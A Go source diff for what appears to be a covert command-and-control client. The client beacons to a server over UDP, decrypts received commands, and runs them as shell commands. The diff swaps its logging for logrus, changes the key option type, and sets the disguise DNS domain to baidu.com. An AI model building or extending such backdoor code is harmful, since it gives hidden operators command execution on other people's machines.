@@ -4,12 +4,12 @@ import (
 	"bytes"
 	"encoding/gob"
 	"fmt"
-	"io"
 	"net"
 	"time"
 
 	"github.com/b1gcat/core/pki"
 	"github.com/b1gcat/core/shellexec"
+	"github.com/sirupsen/logrus"
 )
 
 // Client represents a UDP client
@@ -19,13 +19,6 @@ type Client struct {
 	stopCh chan struct{}
 }
 
-// log outputs a formatted message to the client's logger if configured
-func (c *Client) log(format string, args ...interface{}) {
-	if c.config.Logger != nil {
-		fmt.Fprintf(c.config.Logger, format, args...)
-	}
-}
-
 // NewClient creates a new UDP client with the given options
 func NewClient(opts ...Option) (*Client, error) {
 	config := &Config{
@@ -33,7 +26,7 @@ func NewClient(opts ...Option) (*Client, error) {
 		Address:  "localhost:9001", // Default server address
 		Interval: 30 * time.Second, // Default 30 seconds interval
 		Protocol: ProtocolNone,     // Default no obfuscation
-		Domain:   "example.com",    // Default DNS domain
+		Domain:   "baidu.com",      // Default DNS domain
 	}
 
 	for _, opt := range opts {
@@ -67,9 +60,9 @@ func NewClient(opts ...Option) (*Client, error) {
 }
 
 // WithClientKey sets the encryption key for the client
-func WithClientKey(key []byte) Option {
+func WithClientKey(key string) Option {
 	return func(cfg *Config) {
-		cfg.Key = key
+		cfg.Key = []byte(key)
 	}
 }
 
@@ -108,13 +101,6 @@ func WithClientDomain(domain string) Option {
 	}
 }
 
-// WithClientLogger sets the logger for client output
-func WithClientLogger(logger io.Writer) Option {
-	return func(cfg *Config) {
-		cfg.Logger = logger
-	}
-}
-
 // Start begins the client's probe cycle
 func (c *Client) Start() error {
 	defer c.conn.Close()
@@ -125,10 +111,10 @@ func (c *Client) Start() error {
 			return nil
 		default:
 			if err := c.sendProbe(); err != nil {
-				c.log("client: failed to send probe: %v\n", err)
+				logrus.Debugf("Client failed to send probe: %v", err)
 			}
 			if err := c.receiveResponse(); err != nil {
-				c.log("client: failed to receive response: %v\n", err)
+				logrus.Debugf("Client failed to receive response: %v", err)
 			}
 			time.Sleep(c.config.Interval)
 		}
@@ -228,7 +214,8 @@ func (c *Client) handleCommand(encryptedCmd []byte) error {
 	}
 
 	cmdStr := string(decryptedCmd)
-	c.log("client: received command: %s\n", cmdStr)
+	// Logging handled externally
+	logrus.Debugf("Client received command: %s", cmdStr)
 
 	// Execute command with 10-second timeout
 	result := "result:"
